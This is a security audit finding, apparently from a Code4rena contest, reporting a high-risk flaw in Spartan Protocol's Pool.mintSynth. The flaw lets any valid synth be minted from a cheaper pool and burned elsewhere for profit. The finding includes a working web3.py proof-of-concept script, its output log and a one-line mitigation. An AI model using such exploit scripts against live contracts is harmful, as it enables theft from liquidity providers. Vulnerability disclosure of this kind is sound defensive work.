## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [arbitrary synth mint/burn from pool](https://github.com/code-423n4/2021-07-spartan-findings/issues/20) 

# Handle

jonah1005


# Vulnerability details

## Impact
`Pool` can mint arbitrary `Sythn` provided as long as it's a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.

## Proof of Concept
Pool's mintSynth logic:
https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242

Synth's mintSynth logic:
https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171

Synth's authorization logic:
https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242


The price of the synthetics to be mint is calculated in `Pool` based on the AMM price of the current Pool


Here's a web3.py script of minting arbitrary Synth in a pool.
For simplicity, two pools are set with the assumption that link is 10x expensive than dai.

```python
sparta_amount = 100 * 10**18
initail_link_synth = link_synth.functions.balanceOf(user).call()
base.functions.transfer(link_pool.address, sparta_amount).transact({'from': user})
link_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})
after_link_synth = link_synth.functions.balanceOf(user).call()

print('get link synth amount from link pool:', after_link_synth - initail_link_synth)

sparta_amount = 100 * 10**18
initail_link_synth = link_synth.functions.balanceOf(user).call()
base.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user})
dai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})
after_link_synth = link_synth.functions.balanceOf(user).call()

print('get link synth amount from dai pool:', after_link_synth - initail_link_synth)

```

The log of the above script
```
get link synth amount from link pool: 97078046905036524413
get link synth amount from dai pool: 970780469050365244136
```
## Tools Used

Hardhat

## Recommended Mitigation Steps
Checks the provided synth's underlying token in `mintSynth`
 `require(iSYNTH(synthOut).LayerONE() == TOKEN, "invalid synth");`



